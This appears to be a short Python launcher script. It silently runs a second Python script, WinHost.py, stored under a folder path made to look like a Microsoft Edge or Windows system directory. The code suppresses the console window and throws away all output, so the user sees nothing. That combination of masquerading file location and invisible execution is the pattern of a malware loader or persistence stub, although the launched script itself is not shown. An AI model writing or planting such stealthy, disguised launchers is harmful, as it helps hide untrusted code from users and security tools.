import os
import subprocess

subprocess.run(
    "pythonw C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\WinHost.py", 
    shell=True, 
    stdout=subprocess.PIPE, 
    stderr=subprocess.PIPE, 
    creationflags=subprocess.CREATE_NO_WINDOW
)
